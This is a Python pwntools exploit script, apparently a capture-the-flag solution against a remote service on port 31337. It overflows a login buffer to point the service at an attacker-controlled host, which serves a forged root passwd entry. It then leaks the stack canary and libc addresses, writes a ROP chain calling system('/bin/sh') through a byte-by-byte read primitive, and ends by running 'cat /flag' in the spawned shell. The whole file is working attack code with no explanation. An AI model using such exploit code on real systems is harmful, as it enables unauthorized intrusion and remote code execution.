# -*- coding: utf-8 -*-
from pwn import *
from crypt import crypt

context.arch = "amd64"
r = None


def challenge():
    global r

    def delay():
        # pause()
        # sleep(0.1)
        return

    def sl(x): return r.sendline(x)  # type: ignore
    def se(x): return r.send(x)  # type: ignore
    def ru(x): return r.recvuntil(x)  # type: ignore

    s = server(6666)
    context.log_level = "INFO"
    RHOST = "139.162.36.205"
    LHOST = "10.10.10.10" # edit with your host

    def dump_idx():
        # wait => ctrl C and copy list_null to dump_file
        global r
        context.log_level = "CRITICAL"
        new = 0
        list_null = []
        while 1:
            r = remote(RHOST, 31337)
            ru("Your choice: ")
            sl("1")  # Login
            show_debug = True
            username = "A"*8
            password = "B"*8
            ru("Username: ")
            payload = username.ljust(0x80, "\x00")
            if show_debug:
                payload += "\x01"*8
            else:
                payload += "\x00"*8
            payload += LHOST
            payload = payload.ljust(0xb0, "\x00")
            se(payload)
            ru("Password: ")
            payload = password.ljust(0x80, "\x00")
            se(payload)
            sc = s.next_connection()
            username = "A"*8
            password = "B"*8
            salt = "dcm"
            hash_password = crypt(password, salt)
            uid = 0
            gid = 0
            gecos = "C"*8
            home_dir = "D"*8
            shell = "E"*0x8
            payload = "{}:{}:{}:{}:{}:{}:{}".format(
                username, hash_password, uid, gid, gecos, home_dir, shell)
            sc.sendline(payload)
            sc.close()
            sl("2")
            ru("Enter the index of the file to read: ")
            sl("4")  # 1MB
            ru("How many bytes to read?")
            list_sum = sum(list_null)
            for i in range(list_sum/2048):
                sl(str(2048))
                ru("How many bytes to read?")
            if list_sum % 2048 > 0:
                sl(str(list_sum % 2048))
                ru("How many bytes to read?")
            sl(str(2048))
            res = ru("How many bytes to read?")

            if new != len(res)-23:
                new = len(res)-23
            else:
                list_null.append(len(res)-23)
                new = len(res)-23
            print("new: %d" % new)
            print(list_null)
            r.close()
            continue
        exit(1)

    def dump_file():
        global r
        context.log_level = "CRITICAL"
        data = ""
        list_null = [336, 58, 94, 46, 532, 1492, 193, 9, 237, 187, 43, 240, 161, 297, 137, 585, 127, 85, 6, 305, 543, 255, 286, 348, 53, 265, 3, 643, 141, 138, 281, 1, 381, 155, 791, 133, 289, 40, 345, 18, 762, 1471, 447, 76, 741, 527, 53, 62, 8, 492, 387, 519, 436, 99, 90, 369, 164, 25, 722, 247, 166, 695, 56, 596, 302, 62, 79, 106, 315, 246, 847, 205, 56, 48, 777, 298, 187, 1083, 4, 398, 106, 26, 585, 690, 236, 80, 15, 455, 511, 234, 167, 422, 112, 220, 558, 230, 257, 127, 279, 209, 169, 518, 89,
                     169, 496, 8, 55, 93, 206, 192, 164, 37, 118, 187, 543, 72, 99, 439, 10, 40, 80, 173, 325, 7, 20, 142, 99, 37, 296, 239, 334, 376, 1134, 212, 202, 168, 304, 713, 144, 193, 136, 120, 632, 471, 508, 173, 105, 355, 550, 269, 288, 99, 118, 364, 289, 17, 147, 270, 295, 70, 135, 126, 49, 51, 23, 106, 180, 6, 28, 182, 260, 197, 12, 340, 750, 718, 24, 85, 111, 153, 272, 574, 977, 186, 554, 479, 79, 17, 116, 466, 61, 225, 54, 129, 171, 112, 149, 892, 505, 314, 281, 92, 3, 38, 716, 493, 71, 87, 37, 737]
        while 1:
            r = remote(RHOST, 31337)
            ru("Your choice: ")
            sl("1")  # Login
            show_debug = True
            username = "A"*8
            password = "B"*8
            ru("Username: ")
            payload = username.ljust(0x80, "\x00")
            if show_debug:
                payload += "\x01"*8
            else:
                payload += "\x00"*8
            payload += LHOST
            payload = payload.ljust(0xb0, "\x00")
            se(payload)
            ru("Password: ")
            payload = password.ljust(0x80, "\x00")
            se(payload)
            sc = s.next_connection()
            username = "A"*8
            password = "B"*8
            salt = "dcm"
            hash_password = crypt(password, salt)
            uid = 0
            gid = 0
            gecos = "C"*8
            home_dir = "D"*8
            shell = "E"*0x8
            payload = "{}:{}:{}:{}:{}:{}:{}".format(
                username, hash_password, uid, gid, gecos, home_dir, shell)
            sc.sendline(payload)
            sc.close()
            sl("2")
            ru("Enter the index of the file to read: ")
            sl("4")  # 1MB
            ru("How many bytes to read?")

            for i in list_null:
                sl(str(i))
                res = ru("How many bytes to read?")
                data += res[:len(res)-24]+"\x00"
            open("1MB", "wb").write(data)

    def exploit():
        global r
        context.log_level = "INFO"
        r = remote(RHOST, 31337)
        ru("Your choice: ")
        sl("1")  # Login
        show_debug = True
        username = "A"*8
        password = "B"*8
        ru("Username: ")
        payload = username.ljust(0x80, "\x00")
        if show_debug:
            payload += "\x01"*8
        else:
            payload += "\x00"*8
        payload += LHOST
        payload = payload.ljust(0xb0, "\x00")
        se(payload)
        ru("Password: ")
        payload = password.ljust(0x80, "\x00")
        delay()
        se(payload)
        sc = s.next_connection()
        username = "A"*8
        password = "B"*8
        salt = "dcm"
        hash_password = crypt(password, salt)
        uid = 0
        gid = 0
        gecos = "C"*8
        home_dir = "D"*8
        shell = "E"*0x8
        payload = "{}:{}:{}:{}:{}:{}:{}".format(
            username, hash_password, uid, gid, gecos, home_dir, shell)
        delay()
        sc.sendline(payload)
        sc.close()
        sl("2")
        print(ru("Enter the index of the file to read: "))
        pause()
        sl("4")  # 1MB
        ru("How many bytes to read?")

        sl("265")
        res = ru("How many bytes to read?")
        canary = u64("\x00"+res[265:265+7])  # type: ignore
        log.info("canary: %#x" % canary)
        rbp = u64(res[265+7:265+7+6].ljust(8, "\x00"))  # type: ignore
        log.info("rbp: %#x" % rbp)

        cur_idx = 265
        data = open("1MB", "rb").read()[cur_idx:]

        while 1:
            null_idx = data.find("\x00")+1
            if null_idx >= 0x128:
                sl(str(0x128))
                data = data[0x128:]
                break
            else:
                sl(str(null_idx))
                data = data[null_idx:]
            ru("How many bytes to read?")

        res = ru("How many bytes to read?")

        # libc6_2.35-0ubuntu3.1_amd64 (3d7240354d70ebbd11911187f1acd6e8)
        # https://libc.rip/
        offset_libc_start_main_ret = 0x29d90
        offset_system = 0x50D60
        offset_binsh = 0x1D8698
        offset_pop_rdi = 0x2a3e5
        libc_start_main_ret = u64(
            res[0x128:0x128+6].ljust(8, "\x00"))  # type: ignore
        libc_base = libc_start_main_ret - offset_libc_start_main_ret
        system = libc_base + offset_system
        binsh = libc_base + offset_binsh
        pop_rdi = libc_base + offset_pop_rdi
        ret = pop_rdi + 1
        log.info("libc_start_main_ret: %#x" % libc_start_main_ret)
        log.info("libc_base: %#x" % libc_base)
        log.info("system: %#x" % system)
        log.info("binsh: %#x" % binsh)
        log.info("pop_rdi: %#x" % pop_rdi)

        def sendpayload(idx, payload, data):
            while 1:
                char_to_fill = payload[-1]
                j = idx+len(payload)
                check = data.find(char_to_fill)+1

                if check < j:
                    sl(str(check+1))
                    data = data[check+1:]
                elif(check - j > 256):
                    sl(str(256))
                    data = data[256:]
                else:
                    delay()
                    sl(str(check - j))
                    ru("How many bytes to read?")
                    delay()
                    sl(str(j))
                    data = data[check:]
                    payload = payload[:-1]
                    if(len(payload) == 0):
                        ru("How many bytes to read?")
                        break
                ru("How many bytes to read?")
            return data

        ropchain = fit(ret, pop_rdi, binsh, system)
        pl = [(0x108, p64(canary)), (0x118, ropchain)]
        pl = pl[::-1]
        for p in pl:
            data = sendpayload(p[0], p[1], data)
        sl("0")
        sl("cat /flag")
        r.interactive()

    # dump_idx()
    dump_file()
    exploit()


challenge()
